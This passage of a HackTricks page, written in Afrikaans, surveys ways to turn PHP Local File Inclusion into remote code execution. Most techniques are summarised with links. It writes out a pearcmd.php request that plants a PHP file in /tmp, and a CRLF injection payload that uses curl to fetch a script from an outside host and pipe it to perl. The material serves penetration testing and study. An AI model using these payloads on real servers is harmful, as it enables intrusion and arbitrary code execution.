```
### Via php filters (no file needed)

Hierdie [**beskrywing** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) verduidelik dat jy **php filters om ewekansige inhoud te genereer** kan gebruik as uitvoer. Dit beteken basies dat jy **ewekansige php code** vir die include kan **genereer sonder om dit in 'n lêer te skryf**.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Via segmentation fault

**Laai 'n lêer op** wat as **tydelik** in `/tmp` gestoor sal word, dan in die **selfde versoek,** 'n **segmentation fault** veroorsaak, en dan sal die **tydelike lêer nie verwyder word nie** en jy kan daarvoor soek.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Via Nginx temp file storage

As jy 'n **Local File Inclusion** gevind het en **Nginx** voor PHP loop, mag jy met die volgende tegniek RCE kan bekom:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Via PHP_SESSION_UPLOAD_PROGRESS

As jy 'n **Local File Inclusion** gevind het, selfs as jy **nie 'n session het nie** en `session.auto_start` is `Off`. As jy die **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST** data verskaf, sal PHP die **session vir jou aktiveer**. Jy kan dit misbruik om RCE te kry:


{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Via temp file uploads in Windows

As jy 'n **Local File Inclusion** gevind het en die bediener op **Windows** loop, mag jy RCE kry:


{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

Soos [**verduidelik in hierdie pos**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), die script `/usr/local/lib/phppearcmd.php` bestaan standaard in php docker images. Verder is dit moontlik om argumente aan die script deur die URL te gee omdat aangedui word dat as 'n URL-param nie 'n `=` het nie, dit as 'n argument gebruik moet word. Sien ook [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) en [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die volgende versoek skep 'n lêer in `/tmp/hello.php` met die inhoud `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Die volgende misbruik 'n CRLF vuln om RCE te kry (van [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Deur phpinfo() (file_uploads = on)

As jy 'n **Local File Inclusion** gevind het en 'n lêer wat **phpinfo()** openbaar met file_uploads = on, kan jy RCE kry:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Deur compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

As jy 'n **Local File Inclusion** gevind het en jy **can exfiltrate the path** van die temp-lêer, MAAR die **server** is **checking** of die **file to be included has PHP marks**, kan jy probeer om daardie **bypass that check** met hierdie **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Deur eternal waiting + bruteforce

As jy die LFI kan misbruik om **upload temporary files** en die bediener die PHP-uitvoering laat **hang**, kan jy daarna ure lank **brute force filenames during hours** om die tydelike lêer te vind:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Na Fatal Error

As jy enige van die lêers `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` insluit. (Jy moet dieselfde een 2 keer insluit om daardie fout te veroorsaak).

**Ek weet nie hoe dit nuttig is nie, maar dit kan wees.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
